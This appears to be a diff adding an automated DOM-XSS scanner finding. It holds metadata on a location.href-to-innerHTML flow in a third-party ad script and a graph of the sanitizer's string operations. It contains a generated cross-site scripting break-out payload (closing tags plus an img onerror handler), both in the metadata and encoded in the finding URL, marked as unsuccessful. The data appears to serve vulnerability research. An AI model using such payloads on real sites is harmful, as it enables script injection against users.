@@ -1,0 +1,102 @@
+// Finding: e95dd5e2-f779-4877-bc36-3df7868f924d
+// Finding.url: https://n.example123.com/news/godfather-and-gorney-podcast-cfb-s-biggest-dumpster-fires?ga_source=cm##%22%3E%3C%2Fiframe%3E%3C%2Fstyle%3E%3C%2Fscript%3E%3C%2Fobject%3E%3C%2Fembed%3E%3C%2Ftextarea%3E%3Cimg%20src=x%20onerror=taintfoxLog('e8becc439ded45838b2f77b73b8c88bd')%3E%3C!--%2F*
+// Finding.parentloc: https://n.example123.com/news/godfather-and-gorney-podcast-cfb-s-biggest-dumpster-fires?ga_source=cm##%22%3E%3C%2Fiframe%3E%3C%2Fstyle%3E%3C%2Fscript%3E%3C%2Fobject%3E%3C%2Fembed%3E%3C%2Ftextarea%3E%3Cimg%20src=x%20onerror=taintfoxLog('e8becc439ded45838b2f77b73b8c88bd')%3E%3C!--%2F*
+// Finding.domain: n.example123.com
+// Finding.base_domain: example123.com
+// Finding.source: location.href
+// Finding.sink: innerHTML
+// Sanitizer.score: 3
+// Sanitizer.name: _
+// Sanitizer.location: https://s.example119.com/rq/darla/4-8-0/js/g-r-min.js - _:1:3616
+// Finding.begin: 10539
+// Finding.end: 10551
+// Finding.original_uuid: 122743b1-ae35-46ff-bb2e-63e1373f8a45
+// Finding.TwentyFiveMillionFlowsId: 645378729
+// Finding.script: https://s.example119.com/rq/darla/4-8-0/js/g-r-min.js
+// Finding.line: 1
+// Exploit.uuid: e8becc43-9ded-4583-8b2f-77b73b8c88bd
+// Exploit.success: false
+// Exploit.status: validated
+// Exploit.method: C
+// Exploit.type: html
+// Exploit.token: attribute
+// Exploit.content: name
+// Exploit.quote_type: "
+// Exploit.tag: iframe
+// Exploit.break_out: #"></iframe></style></script></object></embed></textarea><img src=x onerror=
+// Exploit.break_in: ><!--/*
+// Exploit.payload: #"></iframe></style></script></object></embed></textarea><img src=x onerror=taintfoxLog(1)><!--/*
+// Exploit.begin_taint_url: 0
+// Exploit.end_taint_url: 5
+// Exploit.replace_begin_url: 96
+// Exploit.replace_end_url: 96
+// Exploit.replace_begin_param: 17439
+// Exploit.replace_end_param: 17439
+// Issues.LargestEncodeAttrStringChain: 0
+// Issues.LargestTextFragmentEncodeChainLength: 0
+// Issues.HasApproximation: false
+// Issues.HasMissingImplementation: false
+// Issues.HasInfiniteRegexWithFunctionReplacer: false
+// Issues.MergedSplitAndJoins: false
+// Issues.HasUrlInRhsOfReplace: false
+// Issues.HasUrlInLhsOfReplace: false
+// Issues.HasCookieValueInLhsOfreplace: false
+// Issues.HasCookieValueInRhsOfreplace: false
+// Issues.HasCookieValueInMatchPattern: false
+// Issues.HasCookieValueInExecPattern: false
+// Issues.RemovedLRConcats: false
+// Issues.RemovedReplaceArtifacts: false
+// Issues.HasUrlInMatchPattern: false
+// Issues.HasUrlInExecPattern: false
+// Issues.RemovedNOPreplaces: false
+// Issues.Known_sanitizer: false
+// DepGraph.hash: -1974217748
+// DepGraph.sanitizer_hash: -1974217748
+
+digraph cfg {
+n0 [shape=house, label="Input: x"];
+n1 [shape=ellipse, label="regex_exec"];
+n2 [shape=box, label="RegExp: /^(?:([^:/?#.]+):)?(?:\/\/(?:([^\\/?#]*)@)?([^\\/?#]*?)(?::([0-9]+))?(?=[\\/?#]|$))?([^?#]+)?(?:\?([^#]*))?(?:#([\s\S]*))?$/"];
+n3 [shape=box, label="Lit: 3"];
+n4 [shape=box, label="Var: x"];
+n5 [shape=ellipse, label="regex_match"];
+n6 [shape=box, label="RegExp: /^(?:([^:/?#.]+):)?(?:\/\/(?:([^\\/?#]*)@)?([^\\/?#]*?)(?::([0-9]+))?(?=[\\/?#]|$))?([^?#]+)?(?:\?([^#]*))?(?:#([\s\S]*))?$/"];
+n7 [shape=box, label="Lit: 3"];
+n8 [shape=box, label="Var: x"];
+n9 [shape=ellipse, label="preg_replace"];
+n10 [shape=box, label="RegExp: /%25/"];
+n11 [shape=box, label="Lit: %2525"];
+n12 [shape=box, label="Var: x"];
+n13 [shape=ellipse, label="decodeURI"];
+n14 [shape=box, label="Var: x"];
+n15 [shape=ellipse, label="."];
+n16 [shape=box, label="Lit: "];
+n17 [shape=ellipse, label="."];
+n18 [shape=box, label="Lit: "];
+n19 [shape=ellipse, label="escape"];
+n20 [shape=box, label="Var: x"];
+n21 [shape=box, label="Var: x"];
+n22 [shape=doubleoctagon, label="Return: x"];
+n4 -> n0;
+n1 -> n2;
+n1 -> n3;
+n1 -> n4;
+n8 -> n1;
+n5 -> n6;
+n5 -> n7;
+n5 -> n8;
+n12 -> n5;
+n9 -> n10;
+n9 -> n11;
+n9 -> n12;
+n14 -> n9;
+n13 -> n14;
+n15 -> n16;
+n15 -> n13;
+n17 -> n15;
+n17 -> n18;
+n20 -> n17;
+n19 -> n20;
+n21 -> n19;
+n22 -> n21;
+}
